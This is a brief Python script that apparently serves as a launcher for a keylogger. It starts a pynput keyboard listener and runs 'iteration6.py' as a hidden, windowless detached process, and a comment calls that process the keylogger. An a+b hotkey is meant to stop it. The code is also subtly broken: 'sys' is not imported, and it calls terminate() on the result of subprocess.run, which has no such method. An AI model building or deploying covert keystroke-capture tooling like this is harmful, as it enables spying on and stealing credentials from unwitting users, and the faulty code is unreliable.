from pynput import keyboard
import subprocess
import pathlib

base = pathlib.Path(getattr(sys, '_MEIPASS', pathlib.Path(__file__).parent))

pressed_keys = set()

# Added this bypass in case I am not able to find and terminate the keylogger
def on_press(key):
    try:
        # Add the character of the pressed key to the set
        pressed_keys.add(key.char)
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt) if needed
        # For this example, we only care about character keys
        pass

    # Check if both 'a' and 'b' are in the set of pressed keys
    if 'a' in pressed_keys and 'b' in pressed_keys:
        print("Both 'a' and 'b' are pressed simultaneously!")
        # You can add your desired action here
        # To stop the listener after detection, return False
        return False

def on_release(key):
    try:
        # Remove the character of the released key from the set
        pressed_keys.discard(key.char)
    except AttributeError:
        pass
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    sp = subprocess.run(['python', base / 'iteration6.py'], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
    listener.join()

sp.terminate()
sp.wait()
print("Process terminated")